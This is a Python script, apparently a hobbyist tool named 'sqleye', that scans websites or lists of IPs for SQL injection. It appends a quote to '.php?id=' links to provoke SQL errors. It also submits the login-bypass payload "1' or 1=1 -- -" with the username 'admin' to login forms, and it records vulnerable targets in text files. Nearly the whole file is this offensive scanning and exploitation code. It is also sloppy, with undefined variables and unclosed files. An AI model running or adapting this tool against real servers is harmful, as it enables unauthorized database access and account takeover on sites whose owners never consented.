#python3.9
import requests 
from bs4 import BeautifulSoup
from lxml import html, etree
import sys
import re
#use ./sqleye.py website (or ip)
#will add multi threading and reading from a list of servers
def presentation():

    print("[+] # #############################################")
    print("[+] #                                             #")
    print("[+] #          'Hurt,,, feelings,,,' -Mac Miller  #")
    print("[+] #                                             #")
    print("[+] #      ~00xZ-                                 #")
    print("[+] #                                             #")
    print("[+] # #############################################")

def gethref(url):
    ur = (url)
    print("[x] ~ SCAN: " + url + " ~ [x]")
    try:
        req = requests.get(ur, timeout=6)
        soup = BeautifulSoup(req.text, 'html.parser')
        for link in soup.select('a[href*=".php?id="]'):
            okay = (link["href"])
            serv = (ur + okay + "'")
            reeqee = requests.get(serv, timeout=6)
            souper = BeautifulSoup(reeqee.text, "html.parser")
            if souper(text=lambda t: "SQL syntax" in t):
                print(serv + " :  [!] VULN [!]")
                fo = open("vulnSQLi.txt", "a+")
                fo.write(serv + "\n")
                fo.close
            else:
                print("[x] found sqli but no pass [x] : " + serv )
                pass
    except:
        print("[!] timed out: " + ur)



def try_connect(url, USERS, PASSWORDS, title):
	print("trying")
	try:
		payload = {
			user_field: USERS.replace('\n', ''),
			password_field: PASSWORDS.replace('\n', ''),
		}
		print("[+] PAYLOAD:", payload)
		r2 = requests.post(url, data=payload)
		soup = bs4.BeautifulSoup(r2.text)
		titlenew = str(soup.title)
		#titlenew = (soup.select_one('title').text)
		print(titlenew +":" + title)
		if titlenew != '<title>' + title + '</title>':
			print(serv + " :  [!] LOGIN SQLI : VULN [!] " )
		else:
			print("not vuln")
			pass
	except:
		print("idk")
		gethref(url)
		
		
def loginsql(url, user_field, password_field, USERS, PASSWORDS, title, html_contain):
	#print("made it")
	print("[+] Extracting inputs")
	#print("here")
	tree = html.fromstring(html_contain)
	#print(tree)
	#print("[+] Fetching parameters..")
	form_action_url = list(tree.xpath("//form/@action"))[0]
	payload_fetched = list(set(tree.xpath("//form//input")))

	if len(form_action_url) == 0:
		form_action_url = url

	if "http" not in form_action_url:
		form_action_url = url + form_action_url

	#print("[++] > action : ", form_action_url)
	fields = []
	for each_element in payload_fetched:
		names = each_element.xpath("//@name")
		types = each_element.xpath("//@type")

		for i, name in enumerate(names):
			if types[i] != "submit" and name != "submit":
				print("   [++] > ", str(name), "{" + str(types[i]) + "}")
			fields = names
			#print(fields)
		break
	if len(fields) == 2:
		fields.append("empty-token-field")
	#print(url, fields[0], fields[1], fields[2], USERS, PASSWORDS, title)
	#try_connect(url, fields[0], fields[1], fields[2], USERS, PASSWORDS, title)#not foolproof
	try:
		payload = {
			user_field: USERS.replace('\n', ''),
			password_field: PASSWORDS.replace('\n', ''),
		}
		#print("[+] PAYLOAD:", payload)
		r2 = requests.post(url, data=payload, timeout=7)
		soup = BeautifulSoup(r2.content, 'lxml')
		titlenew = (soup.select_one('title').text)
		titlez = (titlenew + " : " + title)
		if titlenew != title:
			print(serv + " :  [!] LOGIN SQLI : VULN [!] " )
			fo = open("vulnSQLi.txt", "a+")
			fo.write(url + " " +titlez +" with: " +payload+ "\n")
			fo.close
		else:
			print("   Login Fund:NOTVULN")
			fo = open("LOGIN.txt", "a+")
			fo.write(serv + "\n")
			fo.close
			gethref(url)
			pass
	except:
		print("it didnt work")
		gethref(url)
		
		

        
def title(ip):
	url = ("http://" + ip + "/")
	try:
		r = requests.get(url, timeout=6, verify=True)
		soup = BeautifulSoup(r.content, 'lxml')
		title = (soup.select_one('title').text)
		USERS = ("admin")
		PASSWORDS = ("1' or 1=1 -- -")
		user_field = ("username")
		password_field = ("password")
		print("  [+] " + url + " : " + title + "  [+]")
		kkk = open("servers.txt", "a").write(ip + " " + title + "\n")
		loginsql(url, user_field, password_field, USERS, PASSWORDS , title, r.text)
	except:
		gethref(url)

def main():
	presentation()
	count = 0
	if len(sys.argv) < 3:
		print("use -f for file")
		ip = str(sys.argv[1])
		title(ip)
	else:
		input_file = open(sys.argv[2])
		#threads = (sys.argv[3])
		for i in input_file.readlines():
			ip = i.strip("\n")
			title(ip)

main()

